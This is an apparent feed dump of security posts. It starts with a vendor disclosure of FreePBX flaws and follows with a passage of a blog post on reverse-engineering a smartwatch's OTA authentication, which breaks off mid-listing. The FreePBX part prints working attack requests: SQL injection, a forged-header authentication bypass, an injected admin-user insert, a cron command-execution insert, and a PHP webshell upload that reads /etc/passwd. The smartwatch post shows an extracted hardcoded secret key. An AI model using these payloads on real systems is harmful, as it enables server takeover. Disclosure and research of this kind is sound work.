https://10.2.21.156/admin/config.php?display=endpoint&view=basefile&brand=aastra&template=testContent-Type: application/x-www-form-urlencodedContent-Length: 67Origin: https://10.2.21.156Upgrade-Insecure-Requests: 1Sec-Fetch-Mode: navigateSec-Fetch-Site: same-originSec-Fetch-User: ?1Te: trailersbrand='aastra&customfw=1&action=save_firmware&slot1=0.01&slot2=1.09HTTP/1.0 500 Internal Server ErrorDate: Mon, 08 Sep 2025 15:00:25 GMTLast-Modified: Mon, 08 Sep 2025 15:00:25 GMTExpires: Thu, 19 Nov 1981 08:52:00 GMTCache-Control: no-store, no-cache, must-revalidateX-Frame-Options: SAMEORIGINSet-Cookie: PHPSESSID=remlda5a75g6qf2q7pv6805isl; expires=Wed, 08 Oct 2025 15:00:25 GMT; Max-Age=2592000; path=/Set-Cookie: lang=en_USContent-Type: text/html;charset=UTF-8PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'aastra'' at line 1 in file /var/www/html/admin/modules/endpoint/EndpointCommon.class.php on line 1334Stack trace:1. PDOException->() /var/www/html/admin/modules/endpoint/EndpointCommon.class.php:13342. PDOStatement->execute() /var/www/html/admin/modules/endpoint/EndpointCommon.class.php:13343.  FreePBX\modules\Endpoint\EndpointCommon->getFirmware() /var/www/html/admin/modules/endpoint/views/page.endpoint.php:15724. unknown() /var/www/html/admin/modules/endpoint/page.endpoint.php:105. include() /var/www/html/admin/config.php:658SQL Injection Model BasefileA SQL injection vulnerability exists in the FreePBX Endpoint Management module affecting multiple parameters in the model configuration functionality. While authentication is required, the aforementioned authentication bypass is sufficient to exploit this issue. A known username appears to be required, though the default admin user appears sufficient.model, brand, id, template, OIDPOST /admin/config.php?display=endpoint&view=basefile&template=test&brand=aastra&model=6865i HTTP/1.1Host: 10.2.21.156Authorization: Basic YWRtaW46YWRtaW4=User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:142.0) Gecko/20100101 Firefox/142.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate, brReferer: https://10.2.21.156/admin/config.php?display=endpoint&view=basefile&brand=aastra&template=testContent-Type: application/x-www-form-urlencodedContent-Length: 108Origin: https://10.2.21.156Upgrade-Insecure-Requests: 1Sec-Fetch-Mode: navigateSec-Fetch-Site: same-originSec-Fetch-User: ?1Te: trailersmodels%5B%5D='6865i&brand=aastra&id=&template=test&edited=&action=changeBasefile&OID=&param=test&value=valueHTTP/1.0 500 Internal Server ErrorDate: Mon, 08 Sep 2025 14:57:06 GMTLast-Modified: Mon, 08 Sep 2025 14:57:06 GMTExpires: Thu, 19 Nov 1981 08:52:00 GMTCache-Control: no-store, no-cache, must-revalidateX-Frame-Options: SAMEORIGINSet-Cookie: PHPSESSID=svuk514nenpbv4d4g0caggagh3; expires=Wed, 08 Oct 2025 14:57:06 GMT; Max-Age=2592000; path=/Set-Cookie: lang=en_USContent-Type: text/html;charset=UTF-8Exception: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ‘6865i’, ‘phone’, ”, ”, ‘test’, ”, ”, ‘value’, ‘1’)’ at line 1SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ‘6865i’, ‘phone’, ”, ”, ‘test’, ”, ”, ‘value’, ‘1’)’ at line 1:: in file /var/www/html/admin/libraries/utility.functions.php on line 123Stack trace:1. Exception->() /var/www/html/admin/libraries/utility.functions.php:1232. die_freepbx() /var/www/html/admin/modules/endpoint/views/page.endpoint.php:6683. unknown() /var/www/html/admin/modules/endpoint/page.endpoint.php:104. include() /var/www/html/admin/config.php:658SQL Injection Custom ExtensionA SQL injection vulnerability exists in the FreePBX Endpoint Management module affecting the custom extension configuration functionality. While authentication is required, the aforementioned authentication bypass is sufficient to exploit this issue. A known username appears to be required, though the default admin user appears sufficient.POST /admin/config.php?display=endpoint&view=customExt&new=1 HTTP/1.1Host: 10.2.21.156User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:142.0) Gecko/20100101 Firefox/142.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate, brReferer: http://44.195.35.230/admin/config.php?display=endpoint&view=customExt&new=1Content-Type: application/x-www-form-urlencodedContent-Length: 4Origin: http://44.195.35.230Connection: keep-aliveAuthorization: Basic YWRtaW46YWRtaW4=Upgrade-Insecure-Requests: 1Cookie: PHPSESSID=l4b3dh8jq4sq2g6clbrb70i786;HTTP/1.1 500 Internal Server ErrorDate: Mon, 08 Sep 2025 14:53:09 GMTLast-Modified: Mon, 08 Sep 2025 14:53:09 GMTExpires: Thu, 19 Nov 1981 08:52:00 GMTCache-Control: no-store, no-cache, must-revalidateX-Frame-Options: SAMEORIGINConnection: closeContent-Type: text/html;charset=UTF-8Content-Length: 112826PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''''' at line 1 in file /var/www/html/admin/modules/endpoint/EndpointCommon.class.php on line 1965Stack trace:1. PDOException->() /var/www/html/admin/modules/endpoint/EndpointCommon.class.php:19652. PDOStatement->execute() /var/www/html/admin/modules/endpoint/EndpointCommon.class.php:19653. FreePBX\modules\Endpoint\EndpointCommon->getCustomExtView() /var/www/html/admin/modules/endpoint/views/page.endpoint.php:16094. unknown() /var/www/html/admin/modules/endpoint/page.endpoint.php:105. include() /var/www/html/admin/config.php:658Adding a user to the table.id=1%27%3BINSERT%20INTO%20ampusers%20%28username%2C%20password_sha1%2C%20sections%29%20VALUES%20%280x686f72697a6f6e33%2C%200x35653838343839386461323830343731353164306535366638646336323932373733363033643064%2C%200x2a%29%23Remote code execution by inserting into  table as seen in CVE-2025-57819.INSERT INTO cron_jobs (modulename,jobname,command,class,schedule,max_runtime,enabled,execution_order) VALUES ('sysadmin','horizon3','<command>',NULL,'* * * * *',30,1,1) -- CVE-2025-66039 – Auth Type Webserver Authentication Bypass via Forged Authorization Header leading to SQL InjectionNow that we have some SQL injections, we need a way to trigger them without authentication. While looking for the auth bypass described in CVE-2025-57819, we noticed the advanced settings contain a handful of authentication types. The auth types include database, none, user manager, and webserver. FreePBX explains what each other type means, and webserver stuck out as an interesting one to dive into further since it relies on security at the apache level. It is important to note that the authorization type webserver is not the default configuration of FreePBX.If you don’t see Authorization Type make sure you set the following to true to display themWith the pre-requisite configuration taken care of, we started looking for endpoints with the Endpoint Manager module since this is where the authentication bypass for CVE-2025-57819 was discovered. After browsing through the UI and using the provided features we grabbed an authenticated request and sent the same request but with the webserver type. The first error we got back indicated our authentication was incorrect.POST /admin/config.php?display=endpoint&view=customExt HTTP/1.1Host: 10.2.21.156User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0Content-Length: 4Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzipHTTP/1.0 500 Internal Server ErrorDate: Wed, 15 Oct 2025 19:01:57 GMTLast-Modified: Wed, 15 Oct 2025 19:01:57 GMTExpires: Thu, 19 Nov 1981 08:52:00 GMTCache-Control: no-store, no-cache, must-revalidateX-Frame-Options: SAMEORIGINSet-Cookie: PHPSESSID=2j99jt6vo9q3gpe75a2umm0ojd; expires=Fri, 14 Nov 2025 19:01:57 GMT; Max-Age=2592000; path=/Connection: closeContent-Type: text/html;charset=UTF-8Whoops\Exception\ErrorException: Undefined array key "PHP_AUTH_USER" in file /var/www/html/admin/libraries/gui_auth.php on line 38Stack trace:1. Whoops\Exception\ErrorException->() /var/www/html/admin/libraries/gui_auth.php:382. Whoops\Run->handleError() /var/www/html/admin/libraries/gui_auth.php:383.require() /var/www/html/admin/bootstrap.php:2754. require_once() /etc/freepbx.conf:125. include_once() /var/www/html/admin/config.php:131This is an interesting and helpful error, let’s check the code for more information on this file gui_auth.php . On line 38 we encounter an undefined array key for the PHP_AUTH_USER. Searching this keyword further we find in another file ServerBag.php it is expecting an Authorization header with base64 encoded username and password.Once we add an authorization header with our username and random password we are granted access. POST /admin/config.php?display=endpoint&view=customExt HTTP/1.1Host: 10.2.21.156User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0Content-Length: 4Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzipAuthorization: Basic YWRtaW46YWRtaW4=HTTP/1.0 500 Internal Server ErrorDate: Wed, 15 Oct 2025 19:32:14 GMTLast-Modified: Wed, 15 Oct 2025 19:32:14 GMTExpires: Thu, 19 Nov 1981 08:52:00 GMTCache-Control: no-store, no-cache, must-revalidateX-Frame-Options: SAMEORIGINSet-Cookie: PHPSESSID=lfjbdn9m3rbpab4h2mttgkeh3b; expires=Fri, 14 Nov 2025 19:32:14 GMT; Max-Age=2592000; path=/Set-Cookie: lang=en_USContent-Type: text/html;charset=UTF-8PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''''' at line 1 in file /var/www/html/admin/modules/endpoint/EndpointCommon.class.php on line 1953Stack trace:2. PDOException->() /var/www/html/admin/modules/endpoint/EndpointCommon.class.php:19532. PDOStatement->execute() /var/www/html/admin/modules/endpoint/EndpointCommon.class.php:19533. FreePBX\modules\Endpoint\EndpointCommon->getCustomExtView() /var/www/html/admin/modules/endpoint/views/page.endpoint.php:15984. unknown() /var/www/html/admin/modules/endpoint/page.endpoint.php:105. include() /var/www/html/admin/config.php:658Aha! We’ve just proven that we are able to successfully gain SQL Injection by only supplying an Authorization header with a valid username admin  and a invalid password. From here, it’s possible to leverage SQLmap and extract any data from the database or insert as well. For example, if we wanted to insert a user into the ampusers table we can issue a request like so and even though we get a 401 unauthorized, the user is still added to the database.POST /admin/config.php?display=endpoint&view=customExt HTTP/1.1Host: 10.2.21.156User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0Content-Length: 221Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzipAuthorization: Basic YWRtaW46YWRtaW4=id=1%27%3BINSERT%20INTO%20ampusers%20%28username%2C%20password_sha1%2C%20sections%29%20VALUES%20%280x686f72697a6f6e33%2C%200x35653838343839386461323830343731353164306535366638646336323932373733363033643064%2C%200x2a%29%23HTTP/1.0 401 UnauthorizedDate: Wed, 15 Oct 2025 19:38:05 GMTLast-Modified: Wed, 15 Oct 2025 19:38:05 GMTExpires: Thu, 19 Nov 1981 08:52:00 GMTCache-Control: no-store, no-cache, must-revalidateX-Frame-Options: SAMEORIGINSet-Cookie: PHPSESSID=5i38569lk2dpmvebeiqih4uha0; expires=Fri, 14 Nov 2025 19:38:05 GMT; Max-Age=2592000; path=/Set-Cookie: lang=en_USContent-Type: text/html; charset=utf-8We confirmed the SQL Injections work with any authorization type, other authorization types require a valid PHPSESSID, but since the webserver auth type expects the Apache layer to handle the authorization FreePBX blindly trusts any request that contains a valid username in the Authorization header. We are able to leverage this for all the other SQL injections and upload a file that leads to remote code execution.CVE-2025-61678 –  Auth Type Webserver Authentication Bypass via Forged Authorization Header & Arbitrary File Upload VulnerabilityNow that we have a mechanism to bypass authentication under the webserver authorization type. We also noticed some other interesting endpoints. Such as the firmware upload endpoint. This provides the user a way to upload custom phone firmware. After issuing a few legitimate requests to see where the files are uploaded and what path, we noticed firmware is uploaded to the /tftpboot/customfw/ folder on the server. However, we were able to manipulate the file path as to where the file is stored as well as the contents not being validated which enabled us to upload any file types we desire. In this case, we figured a PHP webshell would be a great approach since FreePBX is written in PHP. Based on testing, it is required that a user has already uploaded a firmware file. If one wasn’t uploaded, the request fails.We can issue the following requests to upload a PHP webshellIssue a GET request to retrieve a valid PHPSESSID PHPSESSID=ubm0aqss91m258sf7p1um91to2;GET /admin/config.php HTTP/1.1Host: 10.2.21.156Referer: http://10.2.21.156/admin/config.phpAuthorization: Basic YWRtaW46YWRtaW4=HTTP/1.0 401 UnauthorizedDate: Wed, 15 Oct 2025 19:50:26 GMTLast-Modified: Wed, 15 Oct 2025 19:50:26 GMTExpires: Thu, 19 Nov 1981 08:52:00 GMTCache-Control: no-store, no-cache, must-revalidateX-Frame-Options: SAMEORIGINSet-Cookie: PHPSESSID=ubm0aqss91m258sf7p1um91to2; expires=Fri, 14 Nov 2025 19:50:26 GMT; Max-Age=2592000; path=/Set-Cookie: lang=en_USContent-Type: text/html; charset=utf-8Issue a POST request to upload the file with an arbitrary username and password such as  A valid username is not required.POST /admin/ajax.php?module=endpoint&command=upload_cust_fw HTTP/1.1Host: 10.2.21.156Referer: http://10.2.21.156/admin/config.php?display=endpoint&view=custfwupgradeAuthorization: Basic cmFuZG9tOnJhbmRvbQ==Cookie: PHPSESSID=ubm0aqss91m258sf7p1um91to2;Content-Type: multipart/form-data; boundary=----geckoformboundaryccb9f95c9e4119dba1ec857b71f857d7------geckoformboundaryccb9f95c9e4119dba1ec857b71f857d7Content-Disposition: form-data; name="dzuuid"48069f49-c03e-4182-81f7-48e36622e0d3------geckoformboundaryccb9f95c9e4119dba1ec857b71f857d7Content-Disposition: form-data; name="dzchunkindex"------geckoformboundaryccb9f95c9e4119dba1ec857b71f857d7Content-Disposition: form-data; name="dztotalfilesize"------geckoformboundaryccb9f95c9e4119dba1ec857b71f857d7Content-Disposition: form-data; name="dzchunksize"------geckoformboundaryccb9f95c9e4119dba1ec857b71f857d7Content-Disposition: form-data; name="dztotalchunkcount"------geckoformboundaryccb9f95c9e4119dba1ec857b71f857d7Content-Disposition: form-data; name="dzchunkbyteoffset"------geckoformboundaryccb9f95c9e4119dba1ec857b71f857d7Content-Disposition: form-data; name="fwbrand"------geckoformboundaryccb9f95c9e4119dba1ec857b71f857d7Content-Disposition: form-data; name="fwmodel"------geckoformboundaryccb9f95c9e4119dba1ec857b71f857d7Content-Disposition: form-data; name="fwversion"------geckoformboundaryccb9f95c9e4119dba1ec857b71f857d7Content-Disposition: form-data; name="file"; filename="webshell.php"Content-Type: application/octet-stream<body><form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>"><input type="TEXT" name="cmd" autofocus id="cmd" size="80"><input type="SUBMIT" value="Execute"></form><?php      {          system($_GET['cmd'] . ' 2>&1');      }</pre></html>------geckoformboundaryccb9f95c9e4119dba1ec857b71f857d7--HTTP/1.1 200 OKDate: Wed, 15 Oct 2025 19:57:17 GMTExpires: Thu, 19 Nov 1981 08:52:00 GMTCache-Control: no-store, no-cache, must-revalidatePragma: no-cacheAccess-Control-Allow-Headers: Content-Type, Depth, User-Agent, X-File-Size, X-Requested-With, If-Modified-Since, X-File-Name, Cache-Control, X-Auth-TokenAccess-Control-Allow-Methods: POSTAccess-Control-Allow-Origin: $urlAccess-Control-Max-Age: 86400Content-Length: 15Content-Type: application/jsonLet’s confirm it’s accessible and provides remote code executionGET /webshell.php?cmd=cat+/etc/passwd HTTP/1.1Host: 10.2.21.156User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.6.23Connection: closeHTTP/1.1 200 OKDate: Wed, 15 Oct 2025 20:01:51 GMTVary: Accept-EncodingConnection: closeContent-Type: text/html; charset=UTF-8<body><form method="GET" name="webshell.php"><input type="TEXT" name="cmd" autofocus id="cmd" size="80"><input type="SUBMIT" value="Execute"></form>root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin_apt:x:42:65534::/nonexistent:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologinsystemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologinuuidd:x:100:105::/run/uuidd:/usr/sbin/nologinmessagebus:x:101:106::/nonexistent:/usr/sbin/nologinsystemd-resolve:x:996:996:systemd Resolver:/:/usr/sbin/nologintcpdump:x:102:107::/nonexistent:/usr/sbin/nologinsshd:x:103:65534::/run/sshd:/usr/sbin/nologinpolkitd:x:995:995:polkit:/nonexistent:/usr/sbin/nologinadmin:x:1000:1000:Debian:/home/admin:/bin/bashredis:x:104:109::/var/lib/redis:/usr/sbin/nologinmysql:x:105:112:MySQL Server,,,:/nonexistent:/bin/falsepostfix:x:106:113::/var/spool/postfix:/usr/sbin/nologintftp:x:107:115:tftp daemon,,,:/srv/tftp:/usr/sbin/nologinhaproxy:x:108:116::/var/lib/haproxy:/usr/sbin/nologinavahi:x:109:118:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin_chrony:x:110:120:Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologinasterisk:x:999:994::/home/asterisk:/bin/bash</body>Remediation and Disclosure TimelinesThe authentication bypass received the following mitigations in versions The option to choose authentication provider is now removed from their advanced settings and requires you to set it manually with fwconsole setting AUTHTYPE webserver. Once this is set a security warning is displayed on the dashboard warning the user with the following message.Your system is using webserver authentication for the Authorization Type (Advanced Settings) option, which may offer reduced security compared to the default method.To revert to the default authentication, run:fwconsole setting AUTHTYPE usermanagerIf this configuration is intentional, you may continue using it.For more details, see GHSA-9jvh-mv6x-w698.It’s important to note that the underlying vulnerable code is still present and relies on authentication layers in front to provide security and access to the FreePBX instance. It still requires passing an Authorization header with a Basic base64 encoded username:password. Depending on the endpoint, we noticed a valid username was required. In other cases such as the file upload shared above, a valid username is not required and you can achieve remote code execution with a few steps as outlined. It is best practice not to use the authentication type webserver as it appears to be legacy code. Coverage for these issues is already available in NodeZero. To see how the NodeZero platform can help uncover and remediate critical vulnerabilities like this in your environment, visit our NodeZero Platform page or speak with an expert by requesting a demo.Unknown or suspicious entries in the table.Unknown or suspicious entries in the table.Webshells or other files uploaded to .CVE-2025-61675 SQL InjectionsSeptember 15, 2025 – Horizon3.ai discloses issue to FreePBX.September 15, 2025 – FreePBX acknowledges and begins triage.October 1, 2025 – FreePBX provides a preview patch.October 1, 2025 – Horizon3.ai confirms some SQL injection parameters unpatched.October 3, 2025 – FreePBX provides a preview patch.October 3, 2025 – Horizon3.ai confirms some SQL injection parameters still unpatched.October 7, 2025 – FreePBX provides a preview patch.October 8, 2025 – Horizon3.ai confirms all SQL injections patchedOctober 14, 2025 – CVE-2025-61675 assigned.October 14, 2025 – FreePBX releases patch and advisory.December 11, 2025 – This write-up.CVE-2025-61678 File UploadSeptember 15, 2025 – Horizon3.ai discloses issue to FreePBX.September 15, 2025 – FreePBX acknowledges and begins triage.October 1, 2025 – FreePBX provides a preview patch.October 1, 2025 – Horizon3.ai confirms that the original PoC no longer works after applying the patch.October 14, 2025 – CVE-2025-61675 assigned.October 14, 2025 – FreePBX releases patch and advisory.December 11, 2025 – This write-up.CVE-2025-66039 Auth BypassSeptember 15, 2025 – Horizon3.ai discloses issue to FreePBX.September 15, 2025 – FreePBX acknowledges and begins triage.October 1, 2025 – FreePBX provides a preview patch.October 1, 2025 – Horizon3.ai confirms that the original PoC no longer works after applying the patch.October 30, 2025 – Horizon3 follows up on status.November 25, 2025 – CVE-2025-66039 assigned.December 9, 2025 – FreePBX releases patch and advisory.December 11, 2025 – This write-up.]]></content:encoded></item><item><title>Require Google to Remove One-Click Full Logout URLs</title><link>https://c.org/9wTs4xPztQ</link><author>/u/Redstoneriot234</author><category>netsec</category><pubDate>Fri, 12 Dec 2025 00:20:32 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>A modern tale of blinkenlights</title><link>https://blog.quarkslab.com/modern-tale-blinkenlights.html</link><author>/u/smaury</author><category>netsec</category><pubDate>Thu, 11 Dec 2025 18:08:28 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[This blog post demonstrates how a modern variant of an hardware attack found in the 2000's allowed the extraction of a €12 smartwatch's firmware using only cheap and robust hardware. Damien and Thomas (introduced later in this post) gave a talk on this subject at this year's leHACK edition in Paris.It could have been a Christmas story!  We were visiting one of our local stores in December 2024 when we saw a shelf filled with tiny smartwatches in their boxes with a price label reading "€11.99/each". It was the kind of price we regularly see on AliExpress or Amazon for cheap smartwatches that are known to be scams or at least of very poor quality. This raised our suspicion, so we bought three of them to have a look once Christmas and New Year's Eve would be over. In fact, it was long after Christmas that we finally found some time to tear apart one of these watches and got our curiosity piqued. Some quick tests showed that this watch's sensors were not really good at measuring the blood pressure or track sleep activity, at least for a good reason:
+It appeared there were no such sensors in this watch. At least none positioned close enough to the wrist to measure light reflection as this
+type of sensor usually does.Something was definitely odd about this device, and this was the starting point of a long and unexpected journey into the smartwatch's internals.First things first, we had a look at the printed circuit board () and discovered that the device uses some a SoC from . A quick search on the Internet showed that  has this bad habit of adding markings on their IC that don't directly tell what sort of chip it is . But at least, we knew for sure that this SoC is from , and two test points marked  and  on the PCB indicated how the firmware might have been flashed into the SoC (a hidden USB port exposing its two data lines usually called  and , or sometimes  and ).After some research, we identified a proprietary  programmer that may be able to grab the firmware out of this watch, if we could get our hands on it. We found a programmer for sale on AliExpress with a projected delivery time of about four weeks, which was way too much time to wait for someone who likes solving puzzles. We tried some DIY alternatives but none of them worked against this target. Well, it looked like we had no other choice than to order one of these programmers and patiently wait for it to get delivered, with the hope it would work as expected and extract some valuable bytes out of 's SoC.In the meantime, we decided to try the smartwatch's official Android application and have a look at its features.We installed it on a dedicated smartphone, followed the tutorial and got our brand new smartwatch paired with one of our phones.  After some exploration we realized that unfortunately, its firmware could not be upgraded through the application.  More precisely, the application does not show information about the device's firmware nor its version, but at least it features an online store where one can buy customized dials for a small amount, and even download some of them for free. We downloaded a free custom dial and managed to push it to the smartwatch. After nearly two minutes of uploading, it was satisfying to see it displayed correctly on the watch's screen.  But as we watched the upload percentage slowly increase on the screen, we found it strange that such a small custom dial would take so long to upload to the watch. Using 's  application installed on a phone, we looked for a BLE device in the vicinity with a good signal strength and identified one that corresponded to this watch. Well, this thing uses Bluetooth Low Energy, advertises itself and even accepts connections!  We managed to connect to it, but it was pointless since we had no idea of what data is expected by the watch or how the discovered GATT services and characteristics are used to exchange data. Bluetooth Low Energy also makes sense and explains why the upload process is quite slow with this watch, as its default  is 23 bytes...Since the official application does not seem to offer a way to update our smartwatch's firmware, maybe  has some kind of standard OTA feature it might rely on, we thought. We found some public Github repositories belonging to 's Github account, and among them one looked very promising: .An APK file is available for download, we retrieved it and installed it on our phone and searched for any compatible devices. Our smartwatch was detected as a compatible device by the mobile application, meaning it exposes at least an over-the-air update service through its Bluetooth Low Energy GATT server that we could use to access its firmware. This Android application is quite verbose and gives a lot of details about what it does during a connection to a compatible device, as shown in the logcat extract below (edited for clarity):I ota:RcspAuth: -startAuth- device = name : null ,type : 0 ,address : 5C:C1:B9:XX:XX:XX
+I ota:RcspAuth: -sendAuthDataToDevice- device : name : null ,type : 0 ,address : 5C:C1:B9:XX:XX:XX, authData : 00ABB2CDC69BB454110E827441213DDC87
+D ota:OTAManager: ---onReceiveDeviceData-- >>> device : name : null ,type : 0 ,address : 5C:C1:B9:XX:XX:XX, recv data : 0161721F97C869523CCCE093D7F849CA02
+D ota:RcspAuth: -handleAuthData- device : name : null ,type : 0 ,address : 5C:C1:B9:XX:XX:XX, data : 0161721F97C869523CCCE093D7F849CA02
+I ota:RcspAuth: -sendAuthDataToDevice- device : name : null ,type : 0 ,address : 5C:C1:B9:XX:XX:XX, authData : 0270617373
+D ota:OTAManager: ---onReceiveDeviceData-- >>> device : name : null ,type : 0 ,address : 5C:C1:B9:XX:XX:XX, recv data : 00FB610C70D43E057A45BD14BED523C190
+D ota:RcspAuth: -handleAuthData- device : name : null ,type : 0 ,address : 5C:C1:B9:XX:XX:XX, data : 00FB610C70D43E057A45BD14BED523C190
+I ota:RcspAuth: -handleAuthData- devAuthData : 01957EC91C20CF92F9AEBB9E206C336442
+I ota:RcspAuth: -sendAuthDataToDevice- device : name : null ,type : 0 ,address : 5C:C1:B9:XX:XX:XX, authData : 01957EC91C20CF92F9AEBB9E206C336442
+D ota:OTAManager: ---onReceiveDeviceData-- >>> device : name : null ,type : 0 ,address : 5C:C1:B9:XX:XX:XX, recv data : 0270617373
+D ota:RcspAuth: -handleAuthData- device : name : null ,type : 0 ,address : 5C:C1:B9:XX:XX:XX, data : 0270617373
+W ota:RcspAuth: -onAuthSuccess- device = name : null ,type : 0 ,address : 5C:C1:B9:XX:XX:XX,  auth ok.
+W ota:RcspAuth: -handleAuthData- device : name : null ,type : 0 ,address : 5C:C1:B9:XX:XX:XX, auth ok.
+W ota:OTAManager: -onAuthSuccess- >>> device[name : null ,type : 0 ,address : 5C:C1:B9:XX:XX:XX] auth ok, isBleConnected = true
+'s OTA application implements an authentication mechanism in what looks like a handshake, before doing anything else.
+Based on the captured logcat output, we can summarize this authenticated handshake as follows:APP sends a buffer composed of 17 bytes to the device, with the first byte set to .Device replies with a different buffer of 17 bytes, this time starting with a byte set to .APP sends a buffer of 5 bytes to the device, starting with a byte set to 0x02 and followed by ASCII characters that read
+   "pass".Device responds with a new buffer of 17 bytes starting with .APP sends another buffer of 17 bytes starting with .Device responds with a 5-byte buffer starting with  followed by four ASCII characters that read "pass".From what we saw, it was quite obvious we were facing some kind of mutual authentication algorithm. The application first initiates an authentication step, sending some data to the remote device and waiting for an answer. Based on this answer, it determines if the authentication is correct or not (in our case it sent a "pass" response to the device to notify a successful authentication). Once the application has authenticated the device, the same mechanism is initiated by the smartwatch. The remote device answers the authentication result message previously sent by a new buffer of 17 bytes, which is received by the application that immediately responds with another buffer of 17 bytes. The watch then checks the validity of the received data and notifies the application about the result of this last authentication step with a "pass".Once this is done, both the application and the smarttwatch know for sure that both devices are legitimate and that they can proceed with various OTA operations.It was then clear than we needed to figure out exactly how this authentication is performed in order to play with our watch's OTA service and maybe get our hands on its firmware. It was time to dig deeper into the APK's code, and we already knew where to look thanks to the verbose output.We started with the source code available from the 's OTA Android application's repository we previously found, and identified many references to an  class that seemed to be in charge of the mutual authentication mechanism.The code extract below shows the main interesting parts of this file (Chinese comments have been left as they appear in the original):The  method initializes the Bluetooth connection's parameters while most of the other methods forward any received data to the parent class, . This class is defined in a library called jl_bt_ota_V1.9.2-release-aar.jar available in the repository as a pre-compiled  file. It was time to fire up  and see what was inside this library. Decompilation failed on some parts of this library, but the com.jieli.jl_bt_ota.impl.RcspAuth class looked very interesting as it implements the authentication mechanism we were looking for. 's  method is indeed the one that starts the authentication from the application side, by generating a 16-byte random buffer with the  method, and sending it to the remote device prefixed with a null byte:Even if  struggled decompiling the rest of this method, we noticed that once the application gets a response from the device it checks it against some  returned by a call to , which is a wrapper that calls .It was then clear what the application was doing with this first authentication step. First, it calls the  to generate a random 16-byte challenge to send to the remote device, and effectively sends it prefixed with a null byte. Once the device responds to that challenge, the previously generated random buffer is passed to the  method that returns the expected data if the device knew some shared secret. If the buffer sent by the device matches the one returned by , then the device passed the authentication check. If not, an error is returned.This is a simple challenge-based authentication based on what appears to be a shared secret key, but we didn't have any idea about the algorithm used to compute the expected data from the generated challenge. To make things worse, we noticed that both the  and  methods are implemented in a native library loaded by the  class: As expected, a native JNI library called  is shipped within the APK, implementing all the cryptographic functions we were looking for. We disassembled this library in Ghidra and had a look at the two functions of interest,  and . The  function generates a random buffer based on a series of calls to , without even calling  to seed it (this is a known security problem):The  function however is based on some cryptographic algorithm:We noticed that this function calls the  function with two fixed buffers, one composed of 6 bytes and another one composed of 16 bytes. Initially, it was unclear what this  function was about but after some research we identified it as the  function defined in the Bluetooth specification and used as its legacy authentication algorithm.  This  function relies on a secret 16-byte key, the identity of a device defined as its  Bluetooth address (6 bytes), and a 16-byte random challenge. Our  function accepts a single parameter and we know for sure that it is a random challenge sent by the application, so this function must somehow reference the two other inputs to compute the corresponding . The first parameter passed to  points to a 6-byte buffer defined as follows:        BYTE_ARRAY_001055b0                              XREF[2]:     getEncryptedAuthData:00102fbc(*),
+                                                                      getEncryptedAuthData:00103000(*)
+        001055b0 11 22 33        db[6]
+                 33 22 11
+           001055b0 [0]            11h, 22h, 33h, 33h,
+           001055b4 [4]            22h, 11h
+This is an hardcoded device identity corresponding to the Bluetooth address .The second buffer corresponds to a secret key stored in this library and defined as follows:        BYTE_ARRAY_001055b6                              XREF[3]:     FUN_00102eb0:00102f1c(W),
+                                                                      getEncryptedAuthData:00102fc8(*),
+                                                                      getEncryptedAuthData:0010300c(*)
+        001055b6 06 77 5f        db[16]
+                 87 91 8d
+                 d4 23 00
+           001055b6 [0]             6h, 77h, 5Fh, 87h,
+           001055ba [4]            91h, 8Dh, D4h, 23h,
